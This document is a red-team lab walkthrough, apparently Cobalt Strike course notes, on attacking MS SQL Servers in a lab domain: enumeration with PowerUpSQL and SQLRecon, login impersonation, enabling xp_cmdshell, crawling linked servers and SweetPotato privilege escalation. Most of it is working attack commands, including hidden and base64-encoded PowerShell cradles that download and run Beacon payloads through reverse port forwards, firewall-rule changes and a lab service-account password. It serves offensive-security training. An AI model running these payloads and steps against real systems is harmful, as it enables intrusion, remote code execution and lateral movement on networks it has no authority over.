# MS SQL Intro and Recon

Microsoft SQL Server is a relational database management system commonly found in Windows environments. Theyâ€™re typically used to store information to support a myriad of business functions. In addition to the obvious data theft opportunities, they also have a large attack surface, allowing code execution, privilege escalation, lateral movement and persistence.
PowerUpSQL and SQLRecon are excellent tools for enumerating and interacting with MS SQL Servers.
PowerUpSQL has a few cmdlets available for finding MS SQL Servers, including Get-SQLInstanceDomain, Get-SQLInstanceBroadcast and Get-SQLInstanceScanUDP.

    powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
    
    powershell Get-SQLInstanceDomain

Get-SQLInstanceDomain works by searching for SPNs that begin with MSSQL*.  This output shows that SQL-2 is running an instance of MS SQL server, under the context of the mssql_svc domain account.  You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).
Get-SQLConnectionTest can be used to test whether or not we can connect to the database.

    powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

Then use Get-SQLServerInfo to gather more information about the instance.

    powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

If there are multiple SQL Servers available, you can chain these commands together to automate the data collection.

    powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the info module.
    
    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

The /auth:wintoken option allows SQLRecon to use the access token of the Beacon.  This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  SQLRecon has a nice module which can show us what roles we do have.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

On default installations, standard users do not have this "public" role by default and must be explicitly granted through SQL Server Manager Studio (SSMS).  The aforementioned information on a SQL instance cannot be enumerated if the user's security context does not have a valid role.

Finding a user (or group) that does have access can be challenging, because without the ability to query the SQL instance to ask it, you can be stuck guessing.  One port of call is to look for appropriately named domain groups and their members.

    powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges.  This assumption is the basis of BloodHound's SQLAdmin attack path.  We know that the domain account being used to run the service is DEV\mssql_svc and that the account is kerberoastable owing to its SPN.  If we can crack its plaintext password, we can use it to gain access to the SQL instance.  The credentials can be used with make_token in Beacon and /a:WinToken in SQLRecon; or the /a:WinDomain option with /d:<domain> /u:<username> /p:<password> in SQLRecon directly.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

Once we have access, there are several options for issuing queries against a SQL instance.  Get-SQLQuery from PowerUpSQL:

    powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

SQLRecon:

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

mssqlclient.py from Impacket via proxychains:

    proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25

Or a Windows SQL GUI, such as HeidiSQL via Proxifier:

# MSSQL Impersonation

MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.  One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.

Impersonations must be explicitly granted through securable configurations.

In this example, DEV\Domain Users have been granted the ability to impersonate the DEV\mssql_svc account.  This is clearly a security issue because it gives all Domain Users sysadmin privileges on this instance.
We can discover accounts to impersonate manually using the following queries:

    SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

This shows that the grantee_principal_id, 268, is allowed to impersonate the grantor_principal_id, 267.  The IDs don't mean much, so we can look them up with:

    SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;

Here, we see that 267 is DEV\mssql_svc and 268 is DEV\Domain Users. You can also write your own SQL query that will join these two, or use SQLRecon's impersonate module.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

We can take advantage of this as bfarmer, who we know is not a sysadmin.

    SELECT SYSTEM_USER;
    DEV\bfarmer
    
    SELECT IS_SRVROLEMEMBER('sysadmin');
    0

Use EXECUTE AS to execute a query in the context of the target.
    
    EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
    DEV\mssql_svc
    
    EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
    1

SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an i and specifying the principal to impersonate.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

# MSSQL Command Execution

The xp_cmdshell procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges.  Invoke-SQLOSCmd from PowerUpSQL provides a simple means of using it.

    powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

The same will fail if you try manually in Heidi or mssqlclient, because xp_cmdshell is disabled.

    EXEC xp_cmdshell 'whoami';

To enumerate the current state of xp_cmdshell, use:

    SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

A value of 0 shows that xp_cmdshell is disabled. To enable it:

    sp_configure 'Show Advanced Options', 1; RECONFIGURE;
    sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    
Query sys.configurations again and the xp_cmdshell value should be 1; and xp_cmdshell will also now work.

    #OPSEC
    If you're going to make this type of configuration change to a target, you must ensure you set it back to its original value afterwards.
    The reason this works with Invoke-SQLOSCmd is because it will automatically attempt to enable xp_cmdshell if it's not already, execute the given command, and then disable it again. This is a good example of why      you should study your tools before you use them, so you know what is happening under the hood.

SQLRecon also has a module for interacting with the xp_cmdshell configuration, which can also be combined with the impersonation module.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig

With command execution, we can work towards executing a Beacon payload.  As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload.  Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain.

    run hostname
    getuid
    powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
    rportfwd 8080 127.0.0.1 80

Next, host smb_x64.ps1 at /b on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.

    portscan 10.10.122.25 445
    (ICMP) Target '10.10.122.25' is alive. [read 8 bytes]
    10.10.122.25:445 (platform: 500 version: 10.0 name: SQL-2 domain: DEV)
    Scanner module is complete

We can now download and execute the payload, for example:

    powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"

OR

    powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=

Keep an eye on your web log so you know when the payload has been fetched.

    01/05 15:09:07 visit (port 80) from: 127.0.0.1
    	Request: GET /b
    	page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
    	null

You can then link to the Beacon.

    link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
    [+] established link to child beacon: 10.10.122.25

What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.

# MSSQL Lateral Movement

SQL Servers have a concept called "links", which allows a database instance to access data from an external source.  MS SQL supports multiple sources, including other MS SQL Servers.  These can also be practically anywhere - including other domains, forests or in the cloud.
We can discover any links that the current instance has:
        
    SELECT srvname, srvproduct, rpcout FROM master..sysservers;

This shows that SQL-2 has a link to SQL-1.  The SQLRecon links module could also be used.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links

We can send SQL queries to linked servers using OpenQuery:

    SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');

The use of double and single quotes is important when using OpenQuery.

Or with SQLRecon:

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

We can also check the xp_cmdshell status.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

If xp_cmdshell is disabled, you won't be able to enable it by executing sp_configure via OpenQuery.  If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:

    EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
    EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

NOTE: The square braces are required.

We can query SQL-1 to find out if it has any further links.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io

In this case it does not, but manually querying each server to find additional links can be cumbersome and time-consuming.  Instead, Get-SQLServerLinkCrawl can automatically crawl all available links and shows you a bit of information for each instance.

    powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"

This output shows that the link from SQL-2 to SQL-1 is configured with a local sa account, and that it has sysadmin privileges on the remote server.  Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1.  We do not need to be sysadmin on SQL-2 first.
The lwhoami module in SQLRecon can show similar information.

    execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io

To execute a Beacon on SQL-1, we can pretty much repeat the same steps as previously.  However, note that SQL-1 may only be able to talk to SQL-2 and not to WKSTN-2 or any other machine in the DEV domain.

    run hostname
    getuid
    powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
    rportfwd 8080 127.0.0.1 80

You can use xp_cmdshell on a linked server via OpenQuery (note that you need to prepend a dummy query) for it to work.

    SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')

Or you can use the "AT" syntax:

    EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]    

SQLRecon also has a convenient lxpcmd module.
Once the payload has been executed, connect to the Beacon.

    link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
    [+] established link to child beacon: 10.10.120.25

# MSSQL Privilege Esclation 

This instance of SQL is running as NT Service\MSSQLSERVER, which is the default during more modern SQL installations.  It has a special type of privilege called SeImpersonatePrivilege, which allows the account to "impersonate a client after authentication".

    getuid
    execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

In a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to.  However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. SYSTEM) already running on the machine.  A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue service that the attacker creates.  This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

SweetPotato has a collection of these various techniques which can be executed via Beacon's execute-assembly command.

    execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
    
    connect localhost 4444
